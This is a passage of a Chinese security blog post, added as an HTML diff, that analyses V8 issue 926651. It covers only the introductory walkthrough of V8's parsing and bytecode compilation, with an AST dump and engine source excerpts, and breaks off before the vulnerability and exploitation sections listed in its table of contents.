@@ -1,0 +1,3214 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="ISSUE 926651漏洞分析 0x01 前置知识 从源代码到字节码 流程准备 GenerateUnoptimizedCodeForToplevel FinalizeUnoptimizedCompilationJob   字节码执行 理解字节码&#x2F;虚拟机架构   0x02 漏洞分析利用 patch 分析 POC构造 KeyedStoreIC 漏洞利用   0x03 感想 0x04 参考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISSUE 926651漏洞分析">
+<meta property="og:url" content="https://github.com/ha1vk/2021/08/17/issue-926651/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="ISSUE 926651漏洞分析 0x01 前置知识 从源代码到字节码 流程准备 GenerateUnoptimizedCodeForToplevel FinalizeUnoptimizedCompilationJob   字节码执行 理解字节码&#x2F;虚拟机架构   0x02 漏洞分析利用 patch 分析 POC构造 KeyedStoreIC 漏洞利用   0x03 感想 0x04 参考">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/08/12/QM4yqGd21OKAxjY.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/17/oxQVtZDi3qp8Yzs.png">
+<meta property="article:published_time" content="2021-08-17T03:17:31.000Z">
+<meta property="article:modified_time" content="2025-06-26T10:25:36.909Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/12/QM4yqGd21OKAxjY.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2021/08/17/issue-926651/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ISSUE 926651漏洞分析 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/08/17/issue-926651/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ISSUE 926651漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-08-17 11:17:31" itemprop="dateCreated datePublished" datetime="2021-08-17T11:17:31+08:00">2021-08-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 18:25:36" itemprop="dateModified" datetime="2025-06-26T18:25:36+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><a href="#issue-926651%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">ISSUE 926651漏洞分析</a><ul>
+<li><a href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">0x01 前置知识</a><ul>
+<li><a href="#%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81">从源代码到字节码</a><ul>
+<li><a href="#%E6%B5%81%E7%A8%8B%E5%87%86%E5%A4%87">流程准备</a></li>
+<li><a href="#generateunoptimizedcodefortoplevel">GenerateUnoptimizedCodeForToplevel</a></li>
+<li><a href="#finalizeunoptimizedcompilationjob">FinalizeUnoptimizedCompilationJob</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C">字节码执行</a></li>
+<li><a href="#%E7%90%86%E8%A7%A3%E5%AD%97%E8%8A%82%E7%A0%81/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9E%B6%E6%9E%84">理解字节码&#x2F;虚拟机架构</a></li>
+</ul>
+</li>
+<li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8">0x02 漏洞分析利用</a><ul>
+<li><a href="#patch-%E5%88%86%E6%9E%90">patch 分析</a></li>
+<li><a href="#poc%E6%9E%84%E9%80%A0">POC构造</a></li>
+<li><a href="#keyedstoreic">KeyedStoreIC</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+</ul>
+</li>
+<li><a href="#0x03-%E6%84%9F%E6%83%B3">0x03 感想</a></li>
+<li><a href="#0x04-%E5%8F%82%E8%80%83">0x04 参考</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="从源代码到字节码"><a href="#从源代码到字节码" class="headerlink" title="从源代码到字节码"></a>从源代码到字节码</h3><h4 id="流程准备"><a href="#流程准备" class="headerlink" title="流程准备"></a>流程准备</h4><p>v8执行JS的整个流程如下，JS源码经过Parser翻译为抽象语法树(AST)，然后Interpreter遍历AST语法树，生成ByteCode，ByteCode可以直接被解析执行也可以成为热点以后传给TurboFan进行JIT编译，TurboFan解优化时又可以回到字节码进行执行。<br><img src="https://i.loli.net/2021/08/12/QM4yqGd21OKAxjY.png" alt="img"><br>上图是一个抽象的概念图，我们来实际研究一下v8的源码，使用如下代码进行测试使用</p>
+<pre><code>function fun(x) &#123;
+   var a = 0x666;
+   if (x) &#123;
+      print(&quot;hello&quot;);
+   &#125; else &#123;
+      print(&quot;world&quot;);
+   &#125;
+   return a;
+&#125;
+
+fun(true);
+fun(false);
+%SystemBreak();
+</code></pre>
+<p>首先先打印一遍AST语法树，以便后续分析时对照使用</p>
+<pre><code>./d8 b.js --allow-natives-syntax --print-ast
+[generating bytecode for function: ]
+--- AST ---
+FUNC at 0
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;&quot;
+. INFERRED NAME &quot;&quot;
+. DECLS
+. . FUNCTION &quot;fun&quot; = function fun
+. EXPRESSION STATEMENT at 125
+. . CALL
+. . . VAR PROXY unallocated (0x55c8247ae8b8) (mode = VAR, assigned = true) &quot;fun&quot;
+. . . LITERAL true
+. EXPRESSION STATEMENT at 136
+. . CALL
+. . . VAR PROXY unallocated (0x55c8247ae8b8) (mode = VAR, assigned = true) &quot;fun&quot;
+. . . LITERAL false
+. EXPRESSION STATEMENT at 148
+. . ASSIGN at -1
+. . . VAR PROXY local[0] (0x55c8247aea98) (mode = TEMPORARY, assigned = true) &quot;.result&quot;
+. . . CALL RUNTIME SystemBreak at 148
+. RETURN at -1
+. . VAR PROXY local[0] (0x55c8247aea98) (mode = TEMPORARY, assigned = true) &quot;.result&quot;
+
+[generating bytecode for function: fun]
+--- AST ---
+FUNC at 12
+. KIND 0
+. SUSPEND COUNT 0
+. NAME &quot;fun&quot;
+. PARAMS
+. . VAR (0x55c8247b0908) (mode = VAR, assigned = false) &quot;x&quot;
+. DECLS
+. . VARIABLE (0x55c8247b0908) (mode = VAR, assigned = false) &quot;x&quot;
+. . VARIABLE (0x55c8247b09b0) (mode = VAR, assigned = false) &quot;a&quot;
+. BLOCK NOCOMPLETIONS at -1
+. . EXPRESSION STATEMENT at 29
+. . . INIT at 29
+. . . . VAR PROXY local[0] (0x55c8247b09b0) (mode = VAR, assigned = false) &quot;a&quot;
+. . . . LITERAL 1638
+. IF at 39
+. . CONDITION at 43
+. . . VAR PROXY parameter[0] (0x55c8247b0908) (mode = VAR, assigned = false) &quot;x&quot;
+. . THEN at -1
+. . . BLOCK at -1
+. . . . EXPRESSION STATEMENT at 54
+. . . . . CALL
+. . . . . . VAR PROXY unallocated (0x55c8247b0f88) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;
+. . . . . . LITERAL &quot;hello&quot;
+. . ELSE at -1
+. . . BLOCK at -1
+. . . . EXPRESSION STATEMENT at 88
+. . . . . CALL
+. . . . . . VAR PROXY unallocated (0x55c8247b0f88) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;
+. . . . . . LITERAL &quot;world&quot;
+. RETURN at 112
+. . VAR PROXY local[0] (0x55c8247b09b0) (mode = VAR, assigned = false) &quot;a&quot;
+</code></pre>
+<p>d8中的<code>Shell::ExecuteString</code>函数是执行js的入口，它调用了<code>ScriptCompiler::Compile</code>函数进行脚本的编译</p>
+<pre><code>        maybe_script = ScriptCompiler::Compile(
+            context, &amp;script_source, ScriptCompiler::kNoCompileOptions);
+</code></pre>
+<p>跟踪该函数，它只是简单的设置参数，然后继续调用了<code>CompileUnboundInternal</code>函数，该函数如下:</p>
+<pre><code>MaybeLocal&lt;UnboundScript&gt; ScriptCompiler::CompileUnboundInternal(
+    Isolate* v8_isolate, Source* source, CompileOptions options,
+    NoCacheReason no_cache_reason) &#123;
+...................
+  i::Handle&lt;i::SharedFunctionInfo&gt; result;
+................
+  i::MaybeHandle&lt;i::SharedFunctionInfo&gt; maybe_function_info =
+      i::Compiler::GetSharedFunctionInfoForScript(
+          isolate, str, script_details, source-&gt;resource_options, nullptr,
+          script_data, options, no_cache_reason, i::NOT_NATIVES_CODE);
+................
+  has_pending_exception = !maybe_function_info.ToHandle(&amp;result);
+  RETURN_ON_FAILED_EXECUTION(UnboundScript);
+  RETURN_ESCAPED(ToApiHandle&lt;UnboundScript&gt;(result));
+&#125;
+</code></pre>
+<p>可见其调用了<code>GetSharedFunctionInfoForScript</code>生成函数的一些信息，我们跟进去查看</p>
+<pre><code>MaybeHandle&lt;SharedFunctionInfo&gt; Compiler::GetSharedFunctionInfoForScript(
+    Isolate* isolate, Handle&lt;String&gt; source,
+    const Compiler::ScriptDetails&amp; script_details,
+    ScriptOriginOptions origin_options, v8::Extension* extension,
+    ScriptData* cached_data, ScriptCompiler::CompileOptions compile_options,
+    ScriptCompiler::NoCacheReason no_cache_reason, NativesFlag natives) &#123;
+  ScriptCompileTimerScope compile_timer(isolate, no_cache_reason);
+.......................
+  // Do a lookup in the compilation cache but not for extensions.
+  MaybeHandle&lt;SharedFunctionInfo&gt; maybe_result;
+  IsCompiledScope is_compiled_scope;
+  if (extension == nullptr) &#123;
+    bool can_consume_code_cache =
+        compile_options == ScriptCompiler::kConsumeCodeCache;
+    if (can_consume_code_cache) &#123;
+      compile_timer.set_consuming_code_cache();
+    &#125;
+
+    // First check per-isolate compilation cache.
+    maybe_result = compilation_cache-&gt;LookupScript(
+        source, script_details.name_obj, script_details.line_offset,
+        script_details.column_offset, origin_options, isolate-&gt;native_context(),
+        language_mode);
+    if (!maybe_result.is_null()) &#123;
+      compile_timer.set_hit_isolate_cache();
+    &#125; else if (can_consume_code_cache) &#123;
+      compile_timer.set_consuming_code_cache();
+      // Then check cached code provided by embedder.
+      ..........................
+        maybe_result = inner_result;
+      &#125; else &#123;
+        // Deserializer failed. Fall through to compile.
+        compile_timer.set_consuming_code_cache_failed();
+      &#125;
+    &#125;
+  &#125;
+
+  if (maybe_result.is_null()) &#123;
+    ParseInfo parse_info(isolate);
+    // No cache entry found compile the script.
+    NewScript(isolate, &amp;parse_info, source, script_details, origin_options,
+              natives);
+
+    // Compile the function and add it to the isolate cache.
+    if (origin_options.IsModule()) parse_info.set_module();
+    parse_info.set_extension(extension);
+    parse_info.set_eager(compile_options == ScriptCompiler::kEagerCompile);
+
+    parse_info.set_language_mode(
+        stricter_language_mode(parse_info.language_mode(), language_mode));
+    maybe_result = CompileToplevel(&amp;parse_info, isolate, &amp;is_compiled_scope);
+    Handle&lt;SharedFunctionInfo&gt; result;
+    if (extension == nullptr &amp;&amp; maybe_result.ToHandle(&amp;result)) &#123;
+      DCHECK(is_compiled_scope.is_compiled());
+      compilation_cache-&gt;PutScript(source, isolate-&gt;native_context(),
+                                   language_mode, result);
+    &#125; else if (maybe_result.is_null() &amp;&amp; natives != EXTENSION_CODE &amp;&amp;
+               natives != NATIVES_CODE) &#123;
+      isolate-&gt;ReportPendingMessages();
+    &#125;
+  &#125;
+
+  return maybe_result;
+&#125;
+</code></pre>
+<p>可以看到，这里是对函数进行编译，首先检查是否已有缓存可用，如果没有，则开始新的编译，主要调用了<code>CompileToplevel</code>函数</p>
+<pre><code>MaybeHandle&lt;SharedFunctionInfo&gt; CompileToplevel(
+    ParseInfo* parse_info, Isolate* isolate,
+    IsCompiledScope* is_compiled_scope) &#123;
+................
+  if (parse_info-&gt;literal() == nullptr &amp;&amp;
+      !parsing::ParseProgram(parse_info, isolate)) &#123;
+    return MaybeHandle&lt;SharedFunctionInfo&gt;();
+  &#125;
+................
+  // Generate the unoptimized bytecode or asm-js data.
+  MaybeHandle&lt;SharedFunctionInfo&gt; shared_info =
+      GenerateUnoptimizedCodeForToplevel(
+          isolate, parse_info, isolate-&gt;allocator(), is_compiled_scope);
+...............
+
+  FinalizeScriptCompilation(isolate, parse_info);
+  return shared_info;
+&#125;
+</code></pre>
+<p>该函数主要进行了三个操作，<code>ParseProgram</code>生成AST语法树，调用<code>GenerateUnoptimizedCodeForToplevel</code>生成字节码，最后调用<code>FinalizeScriptCompilation</code>做一些后续工作。</p>
+<h4 id="ParseProgram-ParseProgram调用了DoParseProgram来完成解析的任务"><a href="#ParseProgram-ParseProgram调用了DoParseProgram来完成解析的任务" class="headerlink" title="ParseProgram ParseProgram调用了DoParseProgram来完成解析的任务"></a>ParseProgram ParseProgram调用了DoParseProgram来完成解析的任务</h4><pre><code>FunctionLiteral* Parser::DoParseProgram(Isolate* isolate, ParseInfo* info) &#123;
+  // Note that this function can be called from the main thread or from a
+  // background thread. We should not access anything Isolate / heap dependent
+  // via ParseInfo, and also not pass it forward. If not on the main thread
+  // isolate will be nullptr.
+  DCHECK_EQ(parsing_on_main_thread_, isolate != nullptr);
+  DCHECK_NULL(scope_);
+  DCHECK_NULL(target_stack_);
+
+  ParsingModeScope mode(this, allow_lazy_ ? PARSE_LAZILY : PARSE_EAGERLY);
+  ResetFunctionLiteralId();
+  DCHECK(info-&gt;function_literal_id() == FunctionLiteral::kIdTypeTopLevel ||
+         info-&gt;function_literal_id() == FunctionLiteral::kIdTypeInvalid);
+
+  FunctionLiteral* result = nullptr;
+  &#123;
+    Scope* outer = original_scope_;
+    DCHECK_NOT_NULL(outer);
+    if (info-&gt;is_eval()) &#123;
+      outer = NewEvalScope(outer);
+    &#125; else if (parsing_module_) &#123;
+      DCHECK_EQ(outer, info-&gt;script_scope());
+      outer = NewModuleScope(info-&gt;script_scope());
+    &#125;
+
+    DeclarationScope* scope = outer-&gt;AsDeclarationScope();
+    scope-&gt;set_start_position(0);
+
+    FunctionState function_state(&amp;function_state_, &amp;scope_, scope);
+    ScopedPtrList&lt;Statement&gt; body(pointer_buffer());
+..................
+    &#125; else &#123;
+      // Don&#39;t count the mode in the use counters--give the program a chance
+      // to enable script-wide strict mode below.
+      this-&gt;scope()-&gt;SetLanguageMode(info-&gt;language_mode());
+      ParseStatementList(&amp;body, Token::EOS);
+    &#125;
+...................................
+  info-&gt;set_max_function_literal_id(GetLastFunctionLiteralId());
+
+  // Make sure the target stack is empty.
+  DCHECK_NULL(target_stack_);
+
+  if (has_error()) return nullptr;
+  return result;
+&#125;
+</code></pre>
+<p>该函数主要调用了<code>ParseStatementList</code>函数，而该函数又调用<code>ParseStatementListItem</code></p>
+<pre><code>template &lt;typename Impl&gt;
+typename ParserBase&lt;Impl&gt;::StatementT
+ParserBase&lt;Impl&gt;::ParseStatementListItem() &#123;
+  // ECMA 262 6th Edition
+  // StatementListItem[Yield, Return] :
+  //   Statement[?Yield, ?Return]
+  //   Declaration[?Yield]
+  //
+  // Declaration[Yield] :
+  //   HoistableDeclaration[?Yield]
+  //   ClassDeclaration[?Yield]
+  //   LexicalDeclaration[In, ?Yield]
+  //
+  // HoistableDeclaration[Yield, Default] :
+  //   FunctionDeclaration[?Yield, ?Default]
+  //   GeneratorDeclaration[?Yield, ?Default]
+  //
+  // LexicalDeclaration[In, Yield] :
+  //   LetOrConst BindingList[?In, ?Yield] ;
+
+  switch (peek()) &#123;
+    case Token::FUNCTION:
+      return ParseHoistableDeclaration(nullptr, false);
+    case Token::CLASS:
+      Consume(Token::CLASS);
+      return ParseClassDeclaration(nullptr, false);
+    case Token::VAR:
+    case Token::CONST:
+      return ParseVariableStatement(kStatementListItem, nullptr);
+    case Token::LET:
+      if (IsNextLetKeyword()) &#123;
+        return ParseVariableStatement(kStatementListItem, nullptr);
+      &#125;
+      break;
+    case Token::ASYNC:
+      if (PeekAhead() == Token::FUNCTION &amp;&amp;
+          !scanner()-&gt;HasLineTerminatorAfterNext()) &#123;
+        Consume(Token::ASYNC);
+        return ParseAsyncFunctionDeclaration(nullptr, false);
+      &#125;
+      break;
+    default:
+      break;
+  &#125;
+  return ParseStatement(nullptr, nullptr, kAllowLabelledFunctionStatement);
+&#125;
+</code></pre>
+<p>该函数根据token的类型调用不同的解析函数进行解析。每个Parse函数内又调用其他Parse解析子语句，最终生成一个<code>StatementT</code>节点，这是一种递归下降的分析方法。解析后通过<code>body-&gt;Add(stat);</code>将<code>StatementT</code>按照顺序添加到序列中。解析完成后回到<code>DoParseProgram</code>函数</p>
+<pre><code>     this-&gt;scope()-&gt;SetLanguageMode(info-&gt;language_mode());
+      ParseStatementList(&amp;body, Token::EOS);
+    &#125;
+
+    // The parser will peek but not consume EOS.  Our scope logically goes all
+    // the way to the EOS, though.
+    scope-&gt;set_end_position(peek_position());
+.....................
+.....................
+    int parameter_count = parsing_module_ ? 1 : 0;
+    result = factory()-&gt;NewScriptOrEvalFunctionLiteral(
+        scope, body, function_state.expected_property_count(), parameter_count);
+    result-&gt;set_suspend_count(function_state.suspend_count());
+  &#125;
+
+  info-&gt;set_max_function_literal_id(GetLastFunctionLiteralId());
+
+  // Make sure the target stack is empty.
+  DCHECK_NULL(target_stack_);
+
+  if (has_error()) return nullptr;
+  return result;
+&#125;
+</code></pre>
+<p>通过NewScriptOrEvalFunctionLiteral创建了一个FunctionLiteral对象，并将body等数据包装在内，然后将其作为结果返回。返回到<code>ParseProgram</code>函数以后，将FunctionLiteral对象设置到info中，然后将info返回。</p>
+<pre><code> result = parser.ParseProgram(isolate, info);
+  info-&gt;set_literal(result);
+  if (result == nullptr) &#123;
+    info-&gt;pending_error_handler()-&gt;ReportErrors(isolate, info-&gt;script(),
+                                                info-&gt;ast_value_factory());
+  &#125; else &#123;
+    info-&gt;set_language_mode(info-&gt;literal()-&gt;language_mode());
+    if (info-&gt;is_eval()) &#123;
+      info-&gt;set_allow_eval_cache(parser.allow_eval_cache());
+    &#125;
+  &#125;
+  parser.UpdateStatistics(isolate, info-&gt;script());
+  return (result != nullptr);
+&#125;
+</code></pre>
+<h4 id="GenerateUnoptimizedCodeForToplevel"><a href="#GenerateUnoptimizedCodeForToplevel" class="headerlink" title="GenerateUnoptimizedCodeForToplevel"></a>GenerateUnoptimizedCodeForToplevel</h4><p>接下来回到<code>CompileToplevel</code>，有一点需要解释的是Toplevel的意思就是在脚本最外层的语句，如</p>
+<pre><code>var x = 1;
+print(x);
+funtion fun() &#123;
+    var a = 1;
+    var b = 2;
+&#125;
+</code></pre>
+<p>其中在函数外面的以及function<br>fun()这个声明都属Toplevle，而在函数内部的则属于non<br>Toplevel。解析函数时通过调用<code>ParseHoistableDeclaration</code>可以将函数中non-Toplevel部分解析。<code>ParseProgram</code>得到AST以后，接下来调用<code>GenerateUnoptimizedCodeForToplevel</code>函数生成字节码。</p>
+<pre><code>MaybeHandle&lt;SharedFunctionInfo&gt; GenerateUnoptimizedCodeForToplevel(
+    Isolate* isolate, ParseInfo* parse_info, AccountingAllocator* allocator,
+    IsCompiledScope* is_compiled_scope) &#123;
+  EnsureSharedFunctionInfosArrayOnScript(parse_info, isolate);
+  parse_info-&gt;ast_value_factory()-&gt;Internalize(isolate);
+
+  if (!Compiler::Analyze(parse_info)) return MaybeHandle&lt;SharedFunctionInfo&gt;();
+  DeclarationScope::AllocateScopeInfos(parse_info, isolate);
+
+  // Prepare and execute compilation of the outer-most function.
+  // Create the SharedFunctionInfo and add it to the script&#39;s list.
+  Handle&lt;Script&gt; script = parse_info-&gt;script();
+  Handle&lt;SharedFunctionInfo&gt; top_level =
+      isolate-&gt;factory()-&gt;NewSharedFunctionInfoForLiteral(parse_info-&gt;literal(),
+                                                          script, true);
+</code></pre>
+<p>该函数先是调用<code>NewSharedFunctionInfoForLiteral</code>函数从parse_info-&gt;literal()生成一个<code>SharedFunctionInfo</code>对象，并且该对象会被添加到全局的list列表中</p>
+<pre><code>Handle&lt;SharedFunctionInfo&gt; Factory::NewSharedFunctionInfoForLiteral(
+    FunctionLiteral* literal, Handle&lt;Script&gt; script, bool is_toplevel) &#123;
+  FunctionKind kind = literal-&gt;kind();
+  Handle&lt;SharedFunctionInfo&gt; shared = NewSharedFunctionInfoForBuiltin(
+      literal-&gt;name(), Builtins::kCompileLazy, kind);
+  SharedFunctionInfo::InitFromFunctionLiteral(shared, literal, is_toplevel);
+  SharedFunctionInfo::SetScript(shared, script, literal-&gt;function_literal_id(),
+                                false);
+  return shared;
+&#125;
+
+void SharedFunctionInfo::SetScript(Handle&lt;SharedFunctionInfo&gt; shared,
+                                   Handle&lt;Object&gt; script_object,
+                                   int function_literal_id,
+                                   bool reset_preparsed_scope_data) &#123;
+  if (shared-&gt;script() == *script_object) return;
+  Isolate* isolate = shared-&gt;GetIsolate();
+
+  if (reset_preparsed_scope_data &amp;&amp;
+      shared-&gt;HasUncompiledDataWithPreparseData()) &#123;
+    shared-&gt;ClearPreparseData();
+  &#125;
+
+  // Add shared function info to new script&#39;s list. If a collection occurs,
+  // the shared function info may be temporarily in two lists.
+  // This is okay because the gc-time processing of these lists can tolerate
+  // duplicates.
+  if (script_object-&gt;IsScript()) &#123;
+    DCHECK(!shared-&gt;script()-&gt;IsScript());
+    Handle&lt;Script&gt; script = Handle&lt;Script&gt;::cast(script_object);
+    Handle&lt;WeakFixedArray&gt; list =
+        handle(script-&gt;shared_function_infos(), isolate);
+#ifdef DEBUG
+    DCHECK_LT(function_literal_id, list-&gt;length());
+    MaybeObject maybe_object = list-&gt;Get(function_literal_id);
+    HeapObject heap_object;
+    if (maybe_object-&gt;GetHeapObjectIfWeak(&amp;heap_object)) &#123;
+      DCHECK_EQ(heap_object, *shared);
+    &#125;
+#endif
+    list-&gt;Set(function_literal_id, HeapObjectReference::Weak(*shared));
+.....................................
+</code></pre>
+<p>接下来就是编译函数了</p>
+<pre><code>  std::vector&lt;FunctionLiteral*&gt; functions_to_compile;
+  functions_to_compile.push_back(parse_info-&gt;literal());
+
+  while (!functions_to_compile.empty()) &#123;
+    FunctionLiteral* literal = functions_to_compile.back();
+    functions_to_compile.pop_back();
+    Handle&lt;SharedFunctionInfo&gt; shared_info =
+        Compiler::GetSharedFunctionInfo(literal, script, isolate);
+    if (shared_info-&gt;is_compiled()) continue;
+    if (UseAsmWasm(literal, parse_info-&gt;is_asm_wasm_broken())) &#123;
+        ..............................
+    &#125;
+    std::unique_ptr&lt;UnoptimizedCompilationJob&gt; job(
+        interpreter::Interpreter::NewCompilationJob(
+            parse_info, literal, allocator, &amp;functions_to_compile));
+
+    if (job-&gt;ExecuteJob() == CompilationJob::FAILED ||
+        FinalizeUnoptimizedCompilationJob(job.get(), shared_info, isolate) ==
+            CompilationJob::FAILED) &#123;
+      return MaybeHandle&lt;SharedFunctionInfo&gt;();
+    &#125;
+</code></pre>
+<p>主要是创建了<code>NewCompilationJob</code>对象，然后调用<code>ExecuteJob</code>，实际上调用的函数是<code>InterpreterCompilationJob::Status InterpreterCompilationJob::ExecuteJobImpl()</code></p>
